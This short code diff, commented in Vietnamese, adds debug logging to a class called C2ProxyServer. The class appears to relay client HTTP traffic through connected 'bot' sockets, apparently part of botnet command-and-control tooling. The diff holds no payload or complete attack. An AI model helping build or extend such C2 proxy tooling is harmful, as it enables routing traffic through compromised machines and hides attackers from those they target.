@@ -842,7 +842,10 @@ class C2ProxyServer:
 
             # Gửi frame DATA đầu tiên (nếu là HTTP)
             if not connection['is_https'] and request_data:
+                print(f"📤 Sending initial DATA frame to bot {bot_id} for HTTP request")
                 self._send_data_frame_to_bot(bot_socket, connection_id, request_data)
+            else:
+                print(f"⚠️  Not sending DATA frame: is_https={connection['is_https']}, has_data={bool(request_data)}")
 
             # Bắt đầu 2 chiều: client->bot (DATA frames) và bot->client (RESP frames)
             threading.Thread(target=self._pump_client_to_bot, args=(connection_id,), daemon=True).start()
